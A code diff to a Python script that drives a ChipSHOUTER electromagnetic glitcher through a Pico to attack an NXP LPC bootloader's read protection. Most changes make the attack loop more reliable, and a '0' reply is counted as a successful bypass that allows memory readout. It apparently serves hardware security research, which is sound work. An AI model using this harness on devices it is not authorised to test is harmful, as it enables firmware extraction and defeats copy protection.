@@ -9,9 +9,10 @@ It performs a complete glitch test sequence:
 3. Syncs with LPC bootloader
 4. Configures UART trigger (0x0d)
 5. Sets ChipSHOUTER to hardware trigger high
-6. Arms ChipSHOUTER and Pico
-7. Sends read command "R 0 516096"
-8. Checks result: "19" = fail, "0" = success
+6. Arms ChipSHOUTER (or verifies already armed)
+7. Arms Pico trigger
+8. Sends read command "R 0 516096"
+9. Checks result: "19" = fail, "0" = success
 """
 
 import serial
@@ -29,16 +30,39 @@ def send_command(ser, cmd, wait_time=0.2, verbose=False):
     if verbose:
         print(f">>> {cmd}")
 
-    ser.write(f"{cmd}\r\n".encode())
-    time.sleep(wait_time)
-
-    response = ""
+    # Clear any pending data first
     if ser.in_waiting > 0:
-        response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
+        ser.read(ser.in_waiting)
+
+    ser.write(f"{cmd}\r\n".encode())
+
+    # For ChipSHOUTER commands, poll for response over longer period
+    if cmd.startswith("CS "):
+        response = ""
+        max_wait = 3.0  # Maximum 3 seconds to wait
+        start_time = time.time()
+
+        while time.time() - start_time < max_wait:
+            time.sleep(0.1)
+            if ser.in_waiting > 0:
+                chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
+                response += chunk
+                # If we see the ChipSHOUTER prompt, we're done
+                if "#" in chunk:
+                    break
+
         if verbose and response.strip():
             print(response.strip())
-
-    return response
+        return response
+    else:
+        # Normal command - just wait for the specified time
+        time.sleep(wait_time)
+        response = ""
+        if ser.in_waiting > 0:
+            response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
+            if verbose and response.strip():
+                print(response.strip())
+        return response
 
 
 def wait_for_response(ser, expected_text, timeout=5.0, verbose=False):
@@ -62,11 +86,12 @@ def wait_for_response(ser, expected_text, timeout=5.0, verbose=False):
 
 
 def reboot_pico(ser, verbose=False):
-    """Reboot the Pico and wait for it to come back online."""
+    """Reboot the Pico, reconnect, then reset ChipSHOUTER."""
     if verbose:
         print("Rebooting Pico...")
 
     try:
+        # Reboot Pico first
         send_command(ser, "REBOOT", wait_time=0.1, verbose=verbose)
         ser.close()
     except:
@@ -75,7 +100,7 @@ def reboot_pico(ser, verbose=False):
     # Wait for reboot to complete
     time.sleep(3.0)
 
-    # Reconnect
+    # Reconnect to Pico
     max_retries = 10
     for retry in range(max_retries):
         try:
@@ -83,14 +108,27 @@ def reboot_pico(ser, verbose=False):
             time.sleep(0.5)
             if verbose:
                 print("Reconnected to Pico")
-            return ser
+            break
         except (serial.SerialException, OSError):
             if retry < max_retries - 1:
                 time.sleep(0.5)
             else:
                 raise Exception("Failed to reconnect to Pico after reboot")
 
-    return None
+    # Now reset ChipSHOUTER
+    if verbose:
+        print("Resetting ChipSHOUTER...")
+
+    try:
+        response = send_command(ser, "CS RESET", wait_time=0.5, verbose=verbose)
+        time.sleep(5.0)  # Give ChipSHOUTER time to fully reset
+        if verbose:
+            print("ChipSHOUTER reset complete")
+    except Exception as e:
+        if verbose:
+            print(f"Warning: ChipSHOUTER reset error: {e}")
+
+    return ser
 
 
 def setup_lpc_target(ser, verbose=False):
@@ -99,7 +137,9 @@ def setup_lpc_target(ser, verbose=False):
         print("\nSetting up LPC target...")
 
     # Set target type
-    send_command(ser, "TARGET LPC", wait_time=0.2, verbose=verbose)
+    response = send_command(ser, "TARGET LPC", wait_time=0.2, verbose=verbose)
+    if "OK:" not in response and "Target type set" not in response:
+        raise Exception(f"TARGET LPC command failed - response: {response}")
 
     # Perform sync
     if verbose:
@@ -123,10 +163,16 @@ def configure_glitch(ser, verbose=False):
         print("\nConfiguring glitch parameters...")
 
     # Set UART trigger to 0x0d
-    send_command(ser, "TRIGGER UART 0d", wait_time=0.2, verbose=verbose)
+    response = send_command(ser, "TRIGGER UART 0d", wait_time=0.2, verbose=verbose)
+    if "OK:" not in response:
+        raise Exception(f"TRIGGER UART command failed - response: {response}")
 
     # Set ChipSHOUTER to hardware trigger high
-    send_command(ser, "CS TRIGGER HARDWARE HIGH", wait_time=0.2, verbose=verbose)
+    # This command does not expect a response, just send and wait
+    ser.write(b"CS TRIGGER HARDWARE HIGH\r\n")
+    if verbose:
+        print(">>> CS TRIGGER HARDWARE HIGH")
+    time.sleep(0.5)  # Short delay for command to be processed
 
 
 def perform_glitch_test(ser, verbose=False):
@@ -134,17 +180,39 @@ def perform_glitch_test(ser, verbose=False):
     if verbose:
         print("\nPerforming glitch test...")
 
-    # Arm ChipSHOUTER
-    send_command(ser, "CS ARM", wait_time=0.2, verbose=verbose)
+    # Arm ChipSHOUTER (may already be armed)
+    response = send_command(ser, "CS ARM", wait_time=1.0, verbose=verbose)
+
+    # Validate ChipSHOUTER response - should contain "#" prompt
+    if "#" not in response:
+        raise Exception(f"CS ARM command failed - no ChipSHOUTER prompt in response: '{response}'")
+
+    # Check if ChipSHOUTER returned an error
+    if "Error: Change System State not allowed" in response or "fault] CMD-> arm" in response:
+        # Already armed, this is expected
+        if verbose:
+            print("ChipSHOUTER already armed (this is OK)")
+    elif "# arm" in response or "# arming" in response:
+        # Successfully armed or arming
+        if verbose:
+            print("ChipSHOUTER armed successfully")
+    else:
+        # Unexpected response
+        raise Exception(f"Failed to arm ChipSHOUTER - unexpected response: '{response}'")
+
+    # Delay after arming ChipSHOUTER
+    time.sleep(0.5)
 
     # Arm Pico trigger
-    send_command(ser, "ARM ON", wait_time=0.2, verbose=verbose)
+    response = send_command(ser, "ARM ON", wait_time=0.2, verbose=verbose)
+    if "OK:" not in response and "armed" not in response.lower():
+        raise Exception(f"ARM ON command failed - response: {response}")
 
     # Send read command to target (this will trigger the glitch)
     if verbose:
         print("Sending target command: R 0 516096")
 
-    ser.write(b"TARGET SEND R 0 516096\r\n")
+    ser.write(b'TARGET SEND "R 0 516096"\r\n')
 
     # Wait for response
     time.sleep(1.0)
@@ -158,8 +226,11 @@ def perform_glitch_test(ser, verbose=False):
     # Parse the response to determine glitch result
     # Response "19" means glitch failed (normal operation)
     # Response "0" means glitch succeeded (security bypass)
+    # No response means glitch failed (target didn't respond properly)
 
     if "19" in response:
+        return "FAILED"
+    elif "No response data" in response or not response.strip():
         return "FAILED"
     elif "0" in response and "19" not in response:
         return "SUCCESS"
@@ -204,7 +275,7 @@ def run_glitch_test(num_iterations=1, verbose=True):
                 print("\n✓ GLITCH SUCCESS - Security bypass detected!")
                 success_count += 1
             elif result == "FAILED":
-                print("\n✗ GLITCH FAILED - Normal operation (response: 19)")
+                print("\n✗ GLITCH FAILED - Normal operation or no response")
                 fail_count += 1
             else:
                 print("\n? GLITCH UNKNOWN - Unexpected response")
